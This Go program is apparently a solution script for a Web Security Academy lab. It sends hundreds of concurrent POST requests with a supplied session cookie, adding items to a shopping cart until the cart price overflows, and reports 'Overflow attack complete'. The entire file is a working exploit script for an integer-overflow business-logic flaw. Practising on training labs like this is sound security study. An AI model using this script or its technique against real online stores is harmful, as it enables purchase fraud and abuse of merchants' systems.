package main

import (
  "flag"
  "fmt"
  "net/http"
  "net/url"
  "strings"
  "time"
  "sync"
)

func main() {
  sessionPtr := flag.String("session", "", "session token")
  hostPtr := flag.String("host", "", "host ID")

  flag.Parse()

  client := &http.Client{Timeout: time.Second * 10}

  overFlowCartPrice(client, *sessionPtr, *hostPtr)

  fmt.Println("Overflow attack complete, check cart")
}

// Total number of items added to the cart should = 32076
func overFlowCartPrice(client *http.Client, session string, hostID string) {
  var wg sync.WaitGroup
  maxConnectionsChannel := make(chan bool, 3)
  for i := 0; i < 324; i++ {
    wg.Add(1)
    maxConnectionsChannel <- true
    go func() {
      defer wg.Done()
      defer func(maxConnectionsChannel chan bool) { <-maxConnectionsChannel }(maxConnectionsChannel)
      body := url.Values{}
      body.Add("productId", "1")
      body.Add("redir", "PRODUCT")
      body.Add("quantity", "99")

      req, err := http.NewRequest("POST", "https://"+hostID+".web-security-academy.net/cart", strings.NewReader(body.Encode()))
      if err != nil {
        fmt.Println(err)
        return
      }
      req.Header.Add("Host", hostID+".web-security-academy.net")
      req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
      req.Header.Add("Accept-Language", "en-US,en;q=0.5")
      req.Header.Add("Accept-Encoding", "gzip, deflate")
      req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
      req.Header.Add("Connection", "close")
      req.Header.Add("Cookie", "session="+session)

      resp, err := client.Do(req)
      if err != nil {
        fmt.Println(err)
        return
      }
      resp.Body.Close()
    }()
  }
  wg.Wait()
}
